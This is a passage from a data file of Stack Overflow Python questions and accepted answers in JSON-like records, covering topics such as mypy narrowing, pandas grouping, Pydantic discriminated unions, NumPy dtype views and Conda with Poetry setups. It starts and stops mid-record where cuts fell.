    "AcceptedAnswer": "maintainer here! :wave:\nThe short answer is no you cannot configure Black to fix line length issues in docstrings currently.\nIt's not likely Black will split or merge lines in docstrings as it would be far too risky, structured data can and does exist in docstrings. While I would hope the added newlines wouldn't break the consumers it's still a valid concern.\nThere's currently an open issue asking for this (although it also wants the line length limit for docstrings and strings to be 79) GH-2289, and specifically for docstrings GH-2865. You can also read GH-1713 which is about splitting comments (and likewise has mixed feelings from maintainers).\nFor the time being, perhaps you can look into https://github.com/PyCQA/docformatter which does seem to wrap docstrings (see the --wrap-descriptions and --wrap-summaries options)\n\nP.S. if you're curious whether we'll add a flag to split docstrings or comments, it's once again unlikely since we seek to minimize formatting configurability. Especially as the pre-existing flags only disable certain elements of Black's style (barring --line-length which exists as there's no real consensus what it should be). Feel free to state your arguments in the linked issues tho!\n"
}
{
    "Id": 70938215,
    "PostTypeId": 1,
    "Title": "Why does mypy flag \"Item None has no attribute x\" error even if I check for None?",
    "Body": "Trying to do Python (3.8.8) with type hinting and getting errors from mypy (0.931) that I can't really understand.\nimport xml.etree.ElementTree as ET\ntree = ET.parse('plant_catalog.xml')  # read in file and parse as XML\nroot = tree.getroot()  # get root node\nfor plant in root:  # loop through children\n    if plant.find(\"LIGHT\") and plant.find(\"LIGHT\").text == \"sun\" \n        print(\"foo\")\n\nThis raises the mypy error Item \"None\" of \"Optional[Element]\" has no attribute \"text\".\nBut why? I do check for the possibility of plant.find(\"LIGHT\") returning None in the first half of the if clause. The second part accessing the .text attribute isn't even executed if the first part fails.\nIf I modify to\n    lights = plant.find(\"LIGHT\")\n    if lights:\n        if lights.text == selection:            \n            print(\"foo\")\n\nthe error is gone.\nSo is this because the plant object might still change in between the first check and the second? But assigning to a variable doesn't automatically copy the content, its still just a reference to an object that might change. So why does it pass the second time?\n(Yes, I know that repeating the .find() twice is also not time-efficient.)\n",
    "AcceptedAnswerId": 70938396,
    "AcceptedAnswer": "mypy doesn't know that plant.find(\"LIGHT\") always returns the same value, so it doesn't know that your test is a proper guard.\nSo you need to assign it to a variable. As far as mypy is concerned, the variable can't change from one object to another without being reassigned, and its contents can't change if you don't perform some other operation on it.\n"
}
{
    "Id": 70669213,
    "PostTypeId": 1,
    "Title": "gyp ERR! stack Error: Command failed: python -c import sys; print \"%s.%s.%s\" % sys.version_info[:3]",
    "Body": "I'm trying to npm install in a Vue project, and even if I just ran vue create (name)\nit gives me this err:\nnpm ERR! gyp verb check python checking for Python executable \"c:\\Python310\\python.exe\" in the PATH\nnpm ERR! gyp verb `which` succeeded c:\\Python310\\python.exe c:\\Python310\\python.exe\nnpm ERR! gyp ERR! configure error\nnpm ERR! gyp ERR! stack Error: Command failed: c:\\Python310\\python.exe -c import sys; print \"%s.%s.%s\" % sys.version_info[:3];\nnpm ERR! gyp ERR! stack   File \"\", line 1\nnpm ERR! gyp ERR! stack     import sys; print \"%s.%s.%s\" % sys.version_info[:3];\nnpm ERR! gyp ERR! stack                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nnpm ERR! gyp ERR! stack SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?\nnpm ERR! gyp ERR! stack\nnpm ERR! gyp ERR! stack     at ChildProcess.exithandler (node:child_process:397:12)\nnpm ERR! gyp ERR! stack     at ChildProcess.emit (node:events:390:28)\nnpm ERR! gyp ERR! stack     at maybeClose (node:internal/child_process:1064:16)\nnpm ERR! gyp ERR! stack     at Process.ChildProcess._handle.onexit (node:internal/child_process:301:5)\nnpm ERR! gyp ERR! System Windows_NT 10.0.19044\nnpm ERR! gyp ERR! command \"C:\\\\Program Files\\\\nodejs\\\\node.exe\" \"C:\\\\Upwork\\\\contact_book\\\\node_modules\\\\node-gyp\\\\bin\\\\node-gyp.js\" \"rebuild\" \"--verbose\" \"--libsass_ext=\" \"--libsass_cflags=\" \"--libsass_ldflags=\" \"--libsass_library=\"\nnpm ERR! gyp ERR! cwd C:\\Upwork\\contact_book\\node_modules\\node-sass\nnpm ERR! gyp ERR! node -v v16.13.1\nnpm ERR! gyp ERR! node-gyp -v v3.8.0\nnpm ERR! gyp ERR! not ok\nnpm ERR! Build failed with error code: 1\n\nI tried it in another PC but it is working fine, I think it is because I need to install something (since the PC is new)\n",
    "AcceptedAnswerId": 70968862,
    "AcceptedAnswer": "As @MehdiMamas pointed out in the comments, downgrading Node to v14 should solve the problem\nnvm install 14\nnvm use 14\n\n"
}
{
    "Id": 71535170,
    "PostTypeId": 1,
    "Title": "how to add elements of a list to elements of a row in pandas database",
    "Body": "i have this database  called db in pandas\n index     win  loss  moneywin  moneyloss\nplayer1     5     1       300        100\nplayer2    10     5       650        150\nplayer3    17     6      1100       1050\nplayer11  1010   105     10650      10150\nplayer23  1017   106    101100     101050\n\nand i want to add the elements of list1 to the elements of db\nlist1 = [[player1,105,101,10300,10100],[player3,17,6,1100,1050]]\n\nso the results would be db2\nindex     win   loss   moneywin  moneyloss\nplayer1   110    102   10600      10200\nplayer2    10     5     650         150\nplayer3    34     12    2200       2100\nplayer11  1010   105   10650      10150\nplayer23  1017   106   101100    101050\n\nhow can i go about it?\n",
    "AcceptedAnswerId": 71535349,
    "AcceptedAnswer": "Solution 1:\nCreate a dataframe from list1 then concat it with the given dataframe then group by index and aggregate the remaining columns using sum\ndf1 = pd.DataFrame(list1, columns=df.columns)\ndf_out = pd.concat([df, df1]).groupby('index', sort=False).sum()\n\nSolution 2:\nCreate a dataframe from list1 then add it with the given dataframe using common index\ndf1 = pd.DataFrame(list1, columns=df.columns)\ndf_out = df.set_index('index').add(df1.set_index('index'), fill_value=0)\n\nResult:\nprint(df_out)\n\n           win  loss  moneywin  moneyloss\nindex                                    \nplayer1    110   102     10600      10200\nplayer2     10     5       650        150\nplayer3     34    12      2200       2100\nplayer11  1010   105     10650      10150\nplayer23  1017   106    101100     101050\n\n"
}
{
    "Id": 71539448,
    "PostTypeId": 1,
    "Title": "Using different Pydantic models depending on the value of fields",
    "Body": "I have 2 Pydantic models (var1 and var2). The input of the PostExample method can receive data either for the first model or the second.\nThe use of Union helps in solving this issue, but during validation it throws errors for both the first and the second model.\nHow to make it so that in case of an error in filling in the fields, validator errors are returned only for a certain model, and not for both at once? (if it helps, the models can be distinguished by the length of the field A).\nmain.py\n@app.post(\"/PostExample\")\ndef postExample(request: Union[schemas.var1, schemas.var2]):\n    \n    result = post_registration_request.requsest_response()\n    return result\n  \n  \n\nschemas.py\nclass var1(BaseModel):\n    A: str\n    B: int\n    C: str\n    D: str\n  \n  \nclass var2(BaseModel):\n    A: str\n    E: int\n    F: str\n\n",
    "AcceptedAnswerId": 71545639,
    "AcceptedAnswer": "You could use Discriminated Unions (credits to @larsks for mentioning that in the comments). Setting a discriminated union, \"validation is faster since it is only attempted against one model\", as well as \"only one explicit error is raised in case of failure\". Working example below:\napp.py\nimport schemas\nfrom fastapi import FastAPI, Body\nfrom typing import Union\n\napp = FastAPI()\n\n@app.post(\"/\")\ndef submit(item: Union[schemas.Model1, schemas.Model2] = Body(..., discriminator='model_type')):\n    return item\n\nschemas.py\nfrom typing import Literal\nfrom pydantic import BaseModel\n\nclass Model1(BaseModel):\n    model_type: Literal['m1']\n    A: str\n    B: int\n    C: str\n    D: str\n  \nclass Model2(BaseModel):\n    model_type: Literal['m2']\n    A: str\n    E: int\n    F: str\n\nTest inputs - outputs\n#1 Successful Response   #2 Validation error                   #3 Validation error\n                                          \n# Request body           # Request body                        # Request body\n{                        {                                     {\n  \"model_type\": \"m1\",      \"model_type\": \"m1\",                   \"model_type\": \"m2\",\n  \"A\": \"string\",           \"A\": \"string\",                        \"A\": \"string\",\n  \"B\": 0,                  \"C\": \"string\",                        \"C\": \"string\",\n  \"C\": \"string\",           \"D\": \"string\"                         \"D\": \"string\"\n  \"D\": \"string\"          }                                     }\n}                                                              \n                        \n# Server response        # Server response                     # Server response\n200                      {                                     {\n                           \"detail\": [                           \"detail\": [\n                             {                                     {\n                               \"loc\": [                              \"loc\": [\n                                 \"body\",                               \"body\",\n                                 \"Model1\",                             \"Model2\",\n                                 \"B\"                                   \"E\"\n                               ],                                    ],\n                               \"msg\": \"field required\",              \"msg\": \"field required\",\n                               \"type\": \"value_error.missing\"         \"type\": \"value_error.missing\"\n                             }                                     },\n                           ]                                       {\n                         }                                           \"loc\": [\n                                                                       \"body\",\n                                                                       \"Model2\",\n                                                                       \"F\"\n                                                                     ],\n                                                                     \"msg\": \"field required\",\n                                                                     \"type\": \"value_error.missing\"\n                                                                   }\n                                                                 ]\n                                                               }\n\nAlternative approach would be to attempt parsing the models (based on a discriminator you pass as query/path param), as described here (Update 1).\n"
}
{
    "Id": 71068392,
    "PostTypeId": 1,
    "Title": "Group and create three new columns by condition [Low, Hit, High]",
    "Body": "I have a large dataset (~5 Mio rows) with results from a Machine Learning training. Now I want to check to see if the results hit the \"target range\" or not. Lets say this range contains all values between -0.25 and +0.25. If it's inside this range, it's a Hit, if it's below Low and on the other side High.\nI now would create this three columns Hit, Low, High and calculate for each row which condition applies and put a 1 into this col, the other two would become 0. After that I would group the values and sum them up. But I suspect there must be a better and faster way, such as calculate it directly while grouping.\n\nData\nimport pandas as pd\n\ndf = pd.DataFrame({\"Type\":[\"RF\", \"RF\", \"RF\", \"MLP\", \"MLP\", \"MLP\"], \"Value\":[-1.5,-0.1,1.7,0.2,-0.7,-0.6]})\n\n+----+--------+---------+\n|    | Type   |   Value |\n|----+--------+---------|\n|  0 | RF     |    -1.5 | <- Low\n|  1 | RF     |    -0.1 | <- Hit\n|  2 | RF     |     1.7 | <- High\n|  3 | MLP    |     0.2 | <- Hit\n|  4 | MLP    |    -0.7 | <- Low\n|  5 | MLP    |    -0.6 | <- Low\n+----+--------+---------+\n\n\nExpected Output\npd.DataFrame({\"Type\":[\"RF\", \"MLP\"], \"Low\":[1,2], \"Hit\":[1,1], \"High\":[1,0]})\n\n+----+--------+-------+-------+--------+\n|    | Type   |   Low |   Hit |   High |\n|----+--------+-------+-------+--------|\n|  0 | RF     |     1 |     1 |      1 |\n|  1 | MLP    |     2 |     1 |      0 |\n+----+--------+-------+-------+--------+\n\n",
    "AcceptedAnswerId": 71068494,
    "AcceptedAnswer": "You could use cut to define the groups and pivot_table to reshape:\n(df.assign(group=pd.cut(df['Value'],\n                        [float('-inf'), -0.25, 0.25, float('inf')],\n                        labels=['Low', 'Hit', 'High']))\n   .pivot_table(index='Type', columns='group', values='Value', aggfunc='count')\n   .reset_index()\n   .rename_axis(None, axis=1)\n)\n\nOr crosstab:\n(pd.crosstab(df['Type'],\n             pd.cut(df['Value'],\n                    [float('-inf'), -0.25, 0.25, float('inf')],\n                    labels=['Low', 'Hit', 'High'])\n             )\n   .reset_index().rename_axis(None, axis=1)\n )\n\noutput:\n  Type  Low  Hit  High\n0  MLP    2    1     0\n1   RF    1    1     1\n\n"
}
{
    "Id": 70953743,
    "PostTypeId": 1,
    "Title": "Reinterpreting NumPy arrays as a different dtype",
    "Body": "Say I have a large NumPy array of dtype int32\nimport numpy as np\nN = 1000  # (large) number of elements\na = np.random.randint(0, 100, N, dtype=np.int32)\n\nbut now I want the data to be uint32. I could do\nb = a.astype(np.uint32)\n\nor even\nb = a.astype(np.uint32, copy=False)\n\nbut in both cases b is a copy of a, whereas I want to simply reinterpret the data in a as being uint32, as to not duplicate the memory. Similarly, using np.asarray() does not help.\nWhat does work is\na.dtpye = np.uint32\n\nwhich simply changes the dtype without altering the data at all. Here's a striking example:\nimport numpy as np\na = np.array([-1, 0, 1, 2], dtype=np.int32)\nprint(a)\na.dtype = np.uint32\nprint(a)  # shows \"overflow\", which is what I want\n\nMy questions are about the solution of simply overwriting the dtype of the array:\n\nIs this legitimate? Can you point me to where this feature is documented?\nDoes it in fact leave the data of the array untouched, i.e. no duplication of the data?\nWhat if I want two arrays a and b sharing the same data, but view it as different dtypes? I've found the following to work, but again I'm concerned if this is really OK to do:\nimport numpy as np\na = np.array([0, 1, 2, 3], dtype=np.int32)\nb = a.view(np.uint32)\nprint(a)  # [0  1  2  3]\nprint(b)  # [0  1  2  3]\na[0] = -1\nprint(a)  # [-1  1  2  3]\nprint(b)  # [4294967295  1  2  3]\n\nThough this seems to work, I find it weird that the underlying data of the two arrays does not seem to be located the same place in memory:\nprint(a.data)\nprint(b.data)\n\nActually, it seems that the above gives different results each time it is run, so I don't understand what's going on there at all.\nThis can be extended to other dtypes, the most extreme of which is probably mixing 32 and 64 bit floats:\nimport numpy as np\na = np.array([0, 1, 2, np.pi], dtype=np.float32)\nb = a.view(np.float64)\nprint(a)  # [0.  1.  2.  3.1415927]\nprint(b)  # [0.0078125  50.12387848]\nb[0] = 8\nprint(a)  # [0.  2.5  2.  3.1415927]\nprint(b)  # [8.  50.12387848]\n\nAgain, is this condoned, if the obtained behaviour is really what I'm after?\n\n",
    "AcceptedAnswerId": 70990732,
    "AcceptedAnswer": "\n\nIs this legitimate? Can you point me to where this feature is documented?\n\n\nThis is legitimate. However, using np.view (which is equivalent) is better since it is compatible with a static analysers (so it is somehow safer). Indeed, the documentation states:\n\nIt\u2019s possible to mutate the dtype of an array at runtime. [...]\nThis sort of mutation is not allowed by the types. Users who want to write statically typed code should instead use the numpy.ndarray.view method to create a view of the array with a different dtype.\n\n\n\nDoes it in fact leave the data of the array untouched, i.e. no duplication of the data?\n\n\nYes. Since the array is still a view on the same internal memory buffer (a basic byte array). Numpy will just reinterpret it differently (this is directly done the C code of each Numpy computing function).\n\n\nWhat if I want two arrays a and b sharing the same data, but view it as different dtypes? [...]\n\n\nnp.view can be used in this case as you did in your example. However, the result is platform dependent. Indeed, Numpy just reinterpret bytes of memory and theoretically the representation of negative numbers can change from one machine to another. Hopefully, nowadays, all mainstream modern processors use use the two's complement (source). This means that a np.in32 value like -1 will be reinterpreted as 2**32-1 = 4294967295 with a view of type np.uint32. Positive signed values are unchanged. As long as you are aware of this, this is fine and the behaviour is predictable.\n\n\nThis can be extended to other dtypes, the most extreme of which is probably mixing 32 and 64 bit floats.\n\n\nWell, put it shortly, this is really like playing fire. In this case this certainly unsafe although it may work on your specific machine. Let us venturing into troubled waters.\nFirst of all, the documentation of np.view states:\n\nThe behavior of the view cannot be predicted just from the superficial appearance of a. It also depends on exactly how a is stored in memory. Therefore if a is C-ordered versus fortran-ordered, versus defined as a slice or transpose, etc., the view may give different results.\n\nThe thing is Numpy reinterpret the pointer using a C code. Thus, AFAIK, the strict aliasing rule applies. This means that reinterpreting a np.float32 value to a np.float64 cause an undefined behaviour. One reason is that the alignment requirements are not the same for np.float32 (typically 4) and np.float32 (typically 8) and so reading an unaligned np.float64 value from memory can cause a crash on some architecture (eg. POWER) although x86-64 processors support this. Another reason comes from the compiler which can over-optimize the code due to the strict aliasing rule by making wrong assumptions in your case (like a np.float32 value and a np.float64 value cannot overlap in memory so the modification of the view should not change the original array). However, since Numpy is called from CPython and no function calls are inlined from the interpreter (probably not with Cython), this last point should not be a problem (it may be the case be if you use Numba or any JIT though). Note that this is safe to get an np.uint8 view of a np.float32 since it does not break the strict aliasing rule (and the alignment is Ok). This could be useful to efficiently serialize Numpy arrays. The opposite operation is not safe (especially due to the alignment).\nUpdate about last section: a deeper analysis from the Numpy code show that some part of the code like type-conversion functions perform a safe type punning using the memmove C call, while some other functions like all basic unary operators or binary ones do not appear to do a proper type punning yet! Moreover, such feature is barely tested by users and tricky corner cases are likely to cause weird bugs (especially if you read and write in two views of the same array). Thus, use it at your own risk.\n"
}
{
    "Id": 71048280,
    "PostTypeId": 1,
    "Title": "Upgrade python to 3.10 in windows; Do I have to reinstall all site-packages manually?",
    "Body": "I have in windows 10 64 bit installed python 3.9 with site-packages. I would like to install python 3.10.2 on windows 10 64 bit and find a way to install packages automatically in python 3.10.2, the same ones I currently have installed in python 3.9. I am also interested in the answer to this question for windows 11 64 bit.\n",
    "AcceptedAnswerId": 71048281,
    "AcceptedAnswer": "I upgraded to python 3.10.2 in windows 10 64 bit. To properly install the packages, install the appropriate version of the Microsoft Visual C++ compiler if necessary. Details can be read https://wiki.python.org/moin/WindowsCompilers . With the upgrade to python 3.10.2 from 3.9, it turned out that I had to do it, due to errors that are appearing during the installation of the packages. Before the installing python 3.10.2, type and execute the following command in the windows command prompt:\npip freeze > reqs.txt\n\nThis command writes to the reqs.txt file the names of all installed packages in the version suitable for pip. If you run the command prompt with administrator privileges, the reqs.txt file will be saved in the directory C:\\WINDOWS\\system32.\nThen, after the installing of python 3.10.2 and the adding it to the paths in PATH, with the help of the command prompt you need to issue the command:\npip install -r reqs.txt\n\nThis will start the installing of the packages in the same versions as for python 3.9. If problems occur, e.g. an installation error appears during the installation of lxml, then you can remove from the regs.txt file the entry with the name of the package whose installation is causing the problem and then install it manually. To edit the reqs.txt file you need the administrator privileges. The easiest way is to run the command prompt in the administrator mode, type reqs.txt and click Enter to edit it.\nI decided later to update the missing packages to the latest version, because I suspected that with python 3.10.2 older versions were not compatible.\nThis means that when upgrading to python 3.10.2 it is worth asking yourself whether it is better to upgrade for all packages. To do this, you can generate the list of the outdated packages using the command:\npip list \u2013-outdated\n\nAfter the printing of the list in the command prompt, you can upgrade the outdated packages using the command:\npip install --upgrade \n\nThis can be automated by the editing of the reqs.txt file and the changing of the mark == to > which will speed up the upgrade. The mark >  should only be changed for the outdated packages or you will get an error: \"Could not find a version that satisfies the requirement ... \".\nSupplement to virtual environments:\nWhen you enter a virtual environment directory (in the windows command prompt):, such as D:\\python_projects\\data_visualization\\env\\Scripts, type activate to activate it. Then create the reqs.txt file analogous to the description above. Then, copy the file to a temporary directory. After this delete the virtual environment, e.g. using the windows explorator by the deleting of the contents of the env directory. Then, using the version of python in windows of our choice, create a virtual environment using the env directory (see: https://docs.python.org/3/library/venv.html). Copy the regs.txt file to the newly created D:\\python_projects\\data_visualization\\env\\Scripts directory. Install site-packages with the support of the regs.txt file as described above.\n"
}
{
    "Id": 71560036,
    "PostTypeId": 1,
    "Title": "How to preform loc with one condition that include two columns",
    "Body": "I have df with two columns A and B both of them are columns with string values.\nExample:\ndf_1 = pd.DataFrame(data={\n    \"A\":['a','b','c'],\n    \"B\":['a x d','z y w','q m c'] #string values not a list\n})\nprint(df_1)\n\n#output\n   A      B\n0  a  a x d\n1  b  z y w\n2  c  q m c\n\nnow what I'm trying  to do is to preform loc in the df_1 to get all the row that col B cointain the string value in col A.\nIn this example the output i want is the first and the third rows:\n   A      B\n0  a  a x d # 'a x d' contain value 'a'\n2  c  q m c # 'q m c' contain value 'c'\n\nI have tried different loc condition but got unhashable type: 'Series' error:\ndf_1.loc[df_1[\"B\"].str.contains(df_1[\"A\"])] #TypeError: unhashable type: 'Series'\ndf_1.loc[df_1[\"A\"] in df_1[\"B\"]] #TypeError: unhashable type: 'Series'\n\nI really don't want to use a for/while loop because of the size of the df.\nAny idea how can I preform this?\n",
    "AcceptedAnswerId": 71560089,
    "AcceptedAnswer": "There is no vectorial method, to map in using two columns. You need to loop here:\nmask = [a in b for a,b in zip(df_1['A'], df_1['B'])]\n\ndf_1.loc[mask]\n\nOutput:\n   A      B\n0  a  a x d\n2  c  q m c\n\ncomparison of speed (3000 rows)\n# operator.contains\n518 \u00b5s \u00b1 4.61 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 1000 loops each)\n\n# list comprehension\n554 \u00b5s \u00b1 3.84 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 1000 loops each)\n\n# numpy.apply_along_axis\n7.32 ms \u00b1 58.8 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 100 loops each)\n\n# apply\n20.7 ms \u00b1 379 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n"
}
{
    "Id": 71106690,
    "PostTypeId": 1,
    "Title": "Polars: Specify dtypes for all columns at once in read_csv",
    "Body": "In Polars, how can one specify a single dtype for all columns in read_csv?\nAccording to the docs, the dtypes argument to read_csv can take either a mapping (dict) in the form of {'column_name': dtype}, or a list of dtypes, one for each column.\nHowever, it is not clear how to specify \"I want all columns to be a single dtype\".\nIf you wanted all columns to be Utf-8 for example and you knew the total number of columns, you could do:\npl.read_csv('sample.csv', dtypes=[pl.Utf8]*number_of_columns)\n\nHowever, this doesn't work if you don't know the total number of columns.\nIn Pandas, you could do something like:\npd.read_csv('sample.csv', dtype=str)\n\nBut this doesn't work in Polars.\n",
    "AcceptedAnswerId": 71108347,
    "AcceptedAnswer": "Reading all data in a csv to any other type than pl.Utf8 likely fails with a lot of null values. We can use expressions to declare how we want to deal with those null values.\nIf you read a csv with infer_schema_length=0, polars does not know the schema and will read all columns as pl.Utf8 as that is a super type of all polars types.\nWhen read as Utf8 we can use expressions to cast all columns.\n(pl.read_csv(\"test.csv\", infer_schema_length=0)\n   .with_columns(pl.all().cast(pl.Int32, strict=False))\n\n"
}
{
    "Id": 71019671,
    "PostTypeId": 1,
    "Title": "VSCode Python Debugger stops suddenly",
    "Body": "after installing Windows updates today, debugging is not working anymore.\nThis is my active debug configuration:\n\"launch\": {\n  \"version\": \"0.2.0\",\n  \"configurations\": [\n    {\n      \"name\": \"DEBUG CURR\",\n      \"type\": \"python\",\n      \"request\": \"launch\",\n      \"program\": \"${file}\",\n      \"console\": \"internalConsole\",\n      \"justMyCode\": false,\n      \"stopOnEntry\": false,\n    }...\n\nWhen I start the debugger, the menu pops up briefly for 1-2 seconds. But then it closes. There is no output in the console.\nIt does not stop at set breakpoints.\nDoes anybody have the same problem? Is there a solution?\nSystem settings\n\nOS: Microsoft Windows 10 Enterprise (10.0.17763 Build 17763)\nVSCode version 1.64.0\nPython version: 3.8.11 (in the active Anaconda Environment)\n\nInstalled VSCode extensions:\n\nPython (Microsoft) version: v2022.0.1786462952\nPylance (Microsoft) version: v2022.2.0\n\n",
    "AcceptedAnswerId": 71020430,
    "AcceptedAnswer": "It's an issue with the latest Python Extension for VSCode.\nDowngrading the python extension to v2021.12.1559732655 fixes the problem.\n\n"
}
{
    "Id": 71027193,
    "PostTypeId": 1,
    "Title": "DatetimeIndex.get_loc is deprecated",
    "Body": "I updated Pandas to 1.4.0 with yfinance 0.1.70.  Previously, I had to stay with Pandas 1.3.5 as Pandas and yfinance did't play well together.  These latest versions of Pandas and yfinance now work together, BUT Pandas now gives me this warning:\nFuture Warning: Passing method to DatetimeIndex.get_loc is deprecated... Use index.get_indexer([item], method=...) instead\n\nI had enough trouble as a novice Python person getting the original get_loc statement to work:\nlast_week = format((df.index[df.index.get_loc(last_week, method='nearest')]).strftime('%Y-%m-%d'))\n\nThis statement allowed me to get a date from the dataframe that I could use further in determining the value associated with that date:\nweek_value = df.loc[last_week, ans]\n\nTruth be known, I am intimidated in trying to change this statement to be compliant with the new and improved get_indexer function.  Can someone help me out please?\n",
    "AcceptedAnswerId": 71027209,
    "AcceptedAnswer": "Should be pretty simple. Just change get_loc(XXX, ...) to get_indexer([XXX], ...)[0]:\nlast_week = format((df.index[df.index.get_indexer([last_week], method='nearest')[0]]).strftime('%Y-%m-%d'))\n\n"
}
{
    "Id": 70851048,
    "PostTypeId": 1,
    "Title": "Does it make sense to use Conda + Poetry?",
    "Body": "Does it make sense to use Conda + Poetry for a Machine Learning project? Allow me to share my (novice) understanding and please correct or enlighten me:\nAs far as I understand, Conda and Poetry have different purposes but are largely redundant:\n\nConda is primarily a environment manager (in fact not necessarily Python), but it can also manage packages and dependencies.\nPoetry is primarily a Python package manager (say, an upgrade of pip), but it can also create and manage Python environments (say, an upgrade of Pyenv).\n\nMy idea is to use both and compartmentalize their roles: let Conda be the environment manager and Poetry the package manager. My reasoning is that (it sounds like) Conda is best for managing environments and can be used for compiling and installing non-python packages, especially CUDA drivers (for GPU capability), while Poetry is more powerful than Conda as a Python package manager.\nI've managed to make this work fairly easily by using Poetry within a Conda environment. The trick is to not use Poetry to manage the Python environment: I'm not using commands like poetry shell or poetry run, only poetry init, poetry install etc (after activating the Conda environment).\nFor full disclosure, my environment.yml file (for Conda) looks like this:\nname: N\n\nchannels:\n  - defaults\n  - conda-forge\n\ndependencies:\n  - python=3.9\n  - cudatoolkit\n  - cudnn\n\nand my poetry.toml file looks like that:\n[tool.poetry]\nname = \"N\"\nauthors = [\"B\"]\n\n[tool.poetry.dependencies]\npython = \"3.9\"\ntorch = \"^1.10.1\"\n\n[build-system]\nrequires = [\"poetry-core>=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\nTo be honest, one of the reasons I proceeded this way is that I was struggling to install CUDA (for GPU support) without Conda.\nDoes this project design look reasonable to you?\n",
    "AcceptedAnswerId": 71110028,
    "AcceptedAnswer": "I have experience with a Conda + Poetry setup, and it's been working fine. The great majority of my dependencies are specified in pyproject.toml, but when there's something that's unavailable in PyPI, or installing it with Conda is easier, I add it to environment.yml. Moreover, Conda is used as a virtual environment manager, which works well with Poetry: there is no need to use poetry run or poetry shell, it is enough to activate the right Conda environment.\nTips for creating a reproducible environment\n\nAdd Poetry, possibly with a version number (if needed), as a dependency in environment.yml, so that you get Poetry installed when you run conda create, along with Python and other non-PyPI dependencies.\nAdd conda-lock, which gives you lock files for Conda dependencies, just like you have poetry.lock for Poetry dependencies.\nConsider using mamba which is generally compatible with conda, but is better at resolving conflicts, and is also much faster. An additional benefit is that all users of your setup will use the same  package resolver, independent from the locally-installed version of Conda.\nBy default, use Poetry for adding Python dependencies. Install packages via Conda if there's a reason to do so (e.g. in order to get a CUDA-enabled version). In such a case, it is best to specify the package's exact version in environment.yml, and after it's installed, to add an entry with the same version specification to Poetry's pyproject.toml (without ^ or ~ before the version number). This will let Poetry know that the package is there and should not be upgraded.\nIf you use a different channels that provide the same packages, it might be not obvious which channel a particular package will be downloaded from. One solution is to specify the channel for the package using the :: notation (see the pytorch entry below), and another solution is to enable strict channel priority. Unfortunately, in Conda 4.x there is no way to enable this option through environment.yml.\nNote that Python adds user site-packages to sys.path, which may cause lack of reproducibility if the user has installed Python packages outside Conda environments. One possible solution is to make sure that the PYTHONNOUSERSITE environment variable is set to True (or to any other non-empty value).\n\nExample\nenvironment.yml:\nname: my_project_env\nchannels:\n  - pytorch\n  - conda-forge\n  # We want to have a reproducible setup, so we don't want default channels,\n  # which may be different for different users. All required channels should\n  # be listed explicitly here.\n  - nodefaults\ndependencies:\n  - python=3.10.*  # or don't specify the version and use the latest stable Python\n  - mamba\n  - pip  # pip must be mentioned explicitly, or conda-lock will fail\n  - poetry=1.*  # or 1.1.*, or no version at all -- as you want\n  - tensorflow=2.8.0\n  - pytorch::pytorch=1.11.0\n  - pytorch::torchaudio=0.11.0\n  - pytorch::torchvision=0.12.0\n\n# Non-standard section listing target platforms for conda-lock:\nplatforms:\n  - linux-64\n\nvirtual-packages.yml (may be used e.g. when we want conda-lock to generate CUDA-enabled lock files even on platforms without CUDA):\nsubdirs:\n  linux-64:\n    packages:\n      __cuda: 11.5\n\nFirst-time setup\nYou can avoid playing with the bootstrap env and simplify the example below if you have conda-lock, mamba and poetry already installed outside your target environment.\n# Create a bootstrap env\nconda create -p /tmp/bootstrap -c conda-forge mamba conda-lock poetry='1.*'\nconda activate /tmp/bootstrap\n\n# Create Conda lock file(s) from environment.yml\nconda-lock -k explicit --conda mamba\n# Set up Poetry\npoetry init --python=~3.10  # version spec should match the one from environment.yml\n# Fix package versions installed by Conda to prevent upgrades\npoetry add --lock tensorflow=2.8.0 torch=1.11.0 torchaudio=0.11.0 torchvision=0.12.0\n# Add conda-lock (and other packages, as needed) to pyproject.toml and poetry.lock\npoetry add --lock conda-lock\n\n# Remove the bootstrap env\nconda deactivate\nrm -rf /tmp/bootstrap\n\n# Add Conda spec and lock files\ngit add environment.yml virtual-packages.yml conda-linux-64.lock\n# Add Poetry spec and lock files\ngit add pyproject.toml poetry.lock\ngit commit\n\nUsage\nThe above setup may seem complex, but it can be used in a fairly simple way.\nCreating the environment\nconda create --name my_project_env --file conda-linux-64.lock\nconda activate my_project_env\npoetry install\n\nActivating the environment\nconda activate my_project_env\n\nUpdating the environment\n# Re-generate Conda lock file(s) based on environment.yml\nconda-lock -k explicit --conda mamba\n# Update Conda packages based on re-generated lock file\nmamba update --file conda-linux-64.lock\n# Update Poetry packages and re-generate poetry.lock\npoetry update\n\n"
}
{
    "Id": 71191907,
    "PostTypeId": 1,
    "Title": "\"No module named x.__main__; 'x' is a package and cannot be directly executed\" when using entry_points / console_scripts",
    "Body": "I have this CLI tool called Rackfocus. I've published to PyPI, and I'm reasonably sure it worked just fine before. When I try to run it with current versions of Python on Mac, I get the error:\nNo module named rackfocus.__main__; 'rackfocus' is a package\nand cannot be directly executed\n\nAll I want is one package with one entry point that users can download and use using pip.\nBased on tutorials, I have this in setup.py:\npackages=['rackfocus']\nentry_points = {\n    'console_scripts': [\n        'rackfocus=rackfocus.run:main'\n    ]\n}\n\nAnd I have a rackfocus.run:main function, an init.py and everything.  What's wrong?\nYou can reproduce this locally:\n\nClone my repo.\nCreate and activate a virtualenv (optional).\npip3 install -e .\npython3 -m rackfocus\n\n",
    "AcceptedAnswerId": 71192123,
